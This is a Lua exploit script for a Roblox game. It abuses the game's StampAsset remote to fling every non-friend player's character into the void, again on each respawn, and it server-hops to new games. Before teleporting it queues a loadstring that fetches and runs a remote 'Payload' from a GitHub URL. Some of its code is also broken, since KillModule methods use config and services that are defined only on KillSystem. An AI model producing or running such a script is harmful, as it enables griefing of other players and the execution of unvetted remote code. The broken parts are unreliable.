local KillSystem = {
    Config = {
        StampAssetId = 41324885,
        CheckInterval = 0.1,
        DefaultCFrameOffset = Vector3.new(0, -9e9, 0),
        CameraFixDelay = 0.1,
        ServerHopMaxRetries = 5,
        ServerHopRetryDelay = 2,
        WaitTimeout = 5,
    },
    Services = {},
    Connections = {},
    LPlate = nil,
}

-- Connection manager for cleanup
function KillSystem:AddConnection(connection)
    table.insert(self.Connections, connection)
end

function KillSystem:CleanupConnections()
    for _, conn in ipairs(self.Connections) do
        conn:Disconnect()
    end
    self.Connections = {}
end

-- Safe WaitForChild with timeout
local function safeWaitForChild(parent, childName, timeout)
    timeout = timeout or KillSystem.Config.WaitTimeout
    local start = tick()
    while tick() - start < timeout do
        local child = parent:FindFirstChild(childName)
        if child then return child end
        task.wait()
    end
    warn(string.format("Failed to find %s in %s within %d seconds", childName, parent.Name, timeout))
    return nil
end

-- Initialize services
function KillSystem:InitServices()
    self.Services.HttpService = game:GetService("HttpService")
    self.Services.TeleportService = game:GetService("TeleportService")
    self.Services.Players = game:GetService("Players")
    self.Services.ReplicatedStorage = game:GetService("ReplicatedStorage")
    self.Services.Workspace = game:GetService("Workspace")
end

-- Find local plate
function KillSystem:FindLocalPlate()
    local plates = safeWaitForChild(self.Services.Workspace, "Plates")
    if not plates then return nil end
    for _, plate in ipairs(plates:GetChildren()) do
        if plate:FindFirstChild("Owner") and plate.Owner.Value == self.Services.Players.LocalPlayer then
            self.LPlate = safeWaitForChild(plate, "Plate")
            return self.LPlate
        end
    end
    warn("Local plate not found")
    return nil
end

-- KillModule
local KillModule = {}

function KillModule:ResolveTarget(target)
    if target:IsA("Player") then
        local char
        local success, result = pcall(function()
            return target.Character or target.CharacterAdded:Wait()
        end)
        if not success or not result then
            warn(string.format("Failed to resolve character for player %s: %s", target.Name, tostring(result)))
            return nil
        end
        char = result
        local hrp = safeWaitForChild(char, "HumanoidRootPart", self.Config.WaitTimeout)
        return hrp
    elseif target:IsA("BasePart") then
        return target
    end
    return nil
end

function KillModule:InvokeStamp(parts, cframe)
    if not parts or not self.StampAsset then return end
    local ok, res = pcall(function()
        return self.StampAsset:InvokeServer(self.Config.StampAssetId, cframe, "{}", parts, 0)
    end)
    if not ok then
        warn("[StampAsset Failed]:", res)
    end
    return res
end

function KillModule:Kill(target, cframeOverride)
    local part = self:ResolveTarget(target)
    if part and self.LPlate then
        local dest = cframeOverride or (self.LPlate.CFrame - self.Config.DefaultCFrameOffset)
        return self:InvokeStamp({ part }, dest)
    end
end

function KillModule:KillMany(targets, cframeOverride)
    local parts = {}
    for _, t in ipairs(targets) do
        local p = self:ResolveTarget(t)
        if p then table.insert(parts, p) end
    end
    if #parts > 0 and self.LPlate then
        local dest = cframeOverride or (self.LPlate.CFrame - self.Config.DefaultCFrameOffset)
        return self:InvokeStamp(parts, dest)
    end
end

function KillModule:AttachAll(interval)
    interval = interval or self.Config.CheckInterval
    task.spawn(function()
        while true do
            local targets = {}
            for _, player in ipairs(self.Services.Players:GetPlayers()) do
                if player ~= self.Services.Players.LocalPlayer and not self.Services.Players.LocalPlayer:IsFriendsWith(player.UserId) then
                    local part = self:ResolveTarget(player)
                    if part then table.insert(targets, part) end
                end
            end
            if #targets > 0 and self.LPlate then
                self:InvokeStamp(targets, self.LPlate.CFrame)
            end
            task.wait(interval)
        end
    end)
end

-- Initialize system
if _G.KillSystemActive then
    warn("ðŸš« Kill system already active")
    return
end
_G.KillSystemActive = true

KillSystem:InitServices()
KillSystem.LPlayer = KillSystem.Services.Players.LocalPlayer
local Remotes = safeWaitForChild(KillSystem.Services.ReplicatedStorage, "Remotes")
if not Remotes then return end
KillModule.StampAsset = safeWaitForChild(Remotes, "StampAsset")
if not KillModule.StampAsset then return end
KillSystem.LPlate = KillSystem:FindLocalPlate()
if not KillSystem.LPlate then return end

-- Monitor player respawns
local function monitorPlayer(player)
    if player ~= KillSystem.LPlayer and not KillSystem.LPlayer:IsFriendsWith(player.UserId) then
        KillSystem:AddConnection(player.CharacterAdded:Connect(function(character)
            local hrp = safeWaitForChild(character, "HumanoidRootPart")
            if hrp then
                KillModule:Kill(hrp)
            end
        end))
    end
end

KillSystem:AddConnection(KillSystem.Services.Players.PlayerAdded:Connect(monitorPlayer))
for _, p in ipairs(KillSystem.Services.Players:GetPlayers()) do
    monitorPlayer(p)
end

-- Camera crash guard
local lastCameraFix = 0
local function safeCameraFix()
    if tick() - lastCameraFix < KillSystem.Config.CameraFixDelay then return end
    local cam = KillSystem.Services.Workspace.CurrentCamera
    if cam and cam.CameraType ~= Enum.CameraType.Custom then
        cam.CameraType = Enum.CameraType.Custom
        lastCameraFix = tick()
    end
end
task.spawn(function()
    task.wait(KillSystem.Config.CameraFixDelay)
    safeCameraFix()
end)
KillSystem:AddConnection(KillSystem.Services.Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
    task.wait(KillSystem.Config.CameraFixDelay)
    safeCameraFix()
end))

-- Server hopping
local order = "Desc"
local function ServerHop()
    local url = string.format(
        "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100",
        game.PlaceId, order
    )
    for attempt = 1, KillSystem.Config.ServerHopMaxRetries do
        local success, result = pcall(function()
            return game:HttpGet(url)
        end)
        if success then
            local decoded = KillSystem.Services.HttpService:JSONDecode(result)
            for _, server in ipairs(decoded.data) do
                if server.maxPlayers > server.playing and server.id ~= game.JobId then
                    if typeof(queue_on_teleport) == "function" then
                        pcall(queue_on_teleport, [[
                            loadstring(game:HttpGet('https://raw.githubusercontent.com/NotH4xor/Bahasf/main/Loader/Payload'))()
                        ]])
                    end
                    KillSystem.Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
                    return
                end
            end
            url = string.format(
                "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100&cursor=%s",
                game.PlaceId, order, decoded.nextPageCursor or ""
            )
        else
            warn(string.format("ServerHop failed: %s", tostring(result)))
        end
        task.wait(KillSystem.Config.ServerHopRetryDelay * attempt)
    end
    warn("ServerHop failed after maximum retries")
end

-- Run server hop watcher
task.spawn(function()
    while task.wait(1) do
        if #KillSystem.Services.Players:GetPlayers() == 2 then
            ServerHop()
        end
    end
end)

-- Start enforcement
KillModule:AttachAll()

-- Cleanup on script termination
game:BindToClose(function()
    KillSystem:CleanupConnections()
end)

print("âœ… Kill system started (with camera crash guard)")
